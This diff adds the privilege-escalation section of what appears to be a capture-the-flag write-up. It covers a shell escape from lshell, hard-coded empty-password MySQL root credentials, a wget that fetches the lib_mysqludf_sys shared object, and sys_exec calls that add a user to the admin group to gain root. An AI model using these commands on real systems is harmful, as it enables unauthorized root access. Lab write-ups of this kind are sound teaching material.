@@ -38,4 +38,36 @@ The resulting attack gives us the usernames and passwords of two users, john and
 
 ## Elevating Access
 
-!
+![](images/john.png "Logging in and exploring as john")
+
+When we log in as either john or robert, we're put into a LiGoat shell that only allows us to perform a limited set of commands, `?`, `help`, `cd`, `clear`, `echo`, `exit`, `ll`, `lpath`, and `ls`. I hadn't heard of `ll` or `lpath` before, so I tried them out, and it looks like `ll` is just an alias for `ls -l`, and `lpath` defines the path that the user is allowed to be in. Running a command other than the ones listed results in an error that the command is unknown, and attempting to explore outside of the allowed path gives a warning on the first attempt and kicks you out of the system on the second attempt.
+
+Using `ls -al`, we can see the dot files that are in our current directory. I hadn't heard of the .lhistory file before, so after some googling, I came to discover that it represents the presence of lshell, which is a limited shell environment [written in Python](https://github.com/ghantoos/lshell "Link to the lshell GitHub repo"). Doing some [research](https://www.aldeid.com/wiki/Lshell "lshell bypass") into lshell showed that it's possible to break out of the limited shell environment with the command `echo os.system('/bin/bash')`. This is because lshell used eval() to strip quotes from the command line, and as a result, it allowed for the execution of valid Python expressions.
+
+![](images/escape.png "Breaking out of lshell")
+
+Now that we're in a regular shell environment, we still need to get root access to the machine. Since this machine is running as a web server, I thought to check the /var/www directory to see if there was anything of interest.
+
+![](images/www.png "Contents of /var/www")
+
+Browsing the files with `cat` showed something interesting in checklogin.php, hard-coded credentials for access to an SQL database.
+
+![](images/checklogin.png "Hardcoded credentials in checklogin.php")
+
+It looks like we can log in to the MySQL database with the username "root" and an empty password. Doing so with `mysql -u root` shows that the credentials are valid.
+
+![](images/mysql.png "Logging in as root to the MySQL database")
+
+Doing some more [research](https://www.adampalmer.me/iodigitalsec/2013/08/13/mysql-root-to-system-root-with-udf-for-windows-and-linux/ "MySQL privilege escalation") shows us that it's possible to escalate our privileges if we already have root access to a MySQL database. To do so, we'll first need to download a [shared object file](https://github.com/mysqludf/lib_mysqludf_sys/blob/master/lib_mysqludf_sys.so "Link to the shared object file") onto our victim. This can be done with the command `wget --no-check-certificate https://raw.githubusercontent.com/mysqludf/lib_mysqludf_sys/master/lib_mysqludf_sys.so -O /home/john/.`.
+
+![](images/wget.png "Downloading the shared object")
+
+This exploit works by loading this file into a new table row and dumping that table row into a new file in the /usr/lib directory. We do this through MySQL ecause our regular user is unable to write to this directory, but because we're running MySQL as the root user, we're able to write to there. Then, we'll create a new function in MySQL that will point to the code in the new file, and then we're able to execute arbitrary system commands with that MySQL function.
+
+However, halfway through the steps to set up the exploit, I found out that the /usr/lib/lib\_mysqludf\_sys.so file already existed, so it looks like the exploit had been already loaded in the system. Testing it out with the MySQL command `select sys_exec('id > /tmp/out; chown john.john /tmp/out');` will write the results of the `id` command to the file /tmp/out, and if we `cat` that file, we see that the program runs as root.
+
+![](images/id.png "Testing the MySQL exploit")
+
+Now that we know we can run arbitrary commands as root, we'll run the MySQL command `select sys_exec('adduser john admin');` which will add the john user to the admin group, giving them access to the `sudo` command. Exiting MySQL with `exit;`, running `sudo su root`, and entering john's password when prompted shows that we are now root!
+
+![](images/root.png "Root access")
